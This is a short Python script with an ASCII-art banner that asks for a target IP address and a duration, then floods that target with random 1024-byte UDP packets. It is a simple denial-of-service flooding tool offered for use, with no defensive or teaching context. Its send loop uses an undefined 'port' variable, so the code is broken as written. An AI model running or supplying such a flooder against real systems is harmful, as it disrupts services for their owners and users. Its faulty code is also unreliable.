import time
import socket
import random

print(r"""
 ____   _____  _  _    _   _  ____   ____  __   __
/ ___| |_   _|| || |  | \ | ||  _ \ | __ ) \ \ / /
\___ \   | |  | || |_ |  \| || | | ||  _ \  \ V /
 ___) |  | |  |__   _|| |\  || |_| || |_) |  | |
|____/   |_|     |_|  |_| \_||____/ |____/   |_|
                                                """)

bytes = random.randbytes(1024)

socketObject = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
ip = input("Input target ip")
socketObject.connect((ip, 1024))

duration = input("Numbers of seconds to send packets ?")
duration = float(duration)
standby = time.time() + duration

print("Target is on standby now")

while True:
    if time.time() > standby:
        break
    else:
        pass
    socketObject.sendto(bytes, (ip, port))
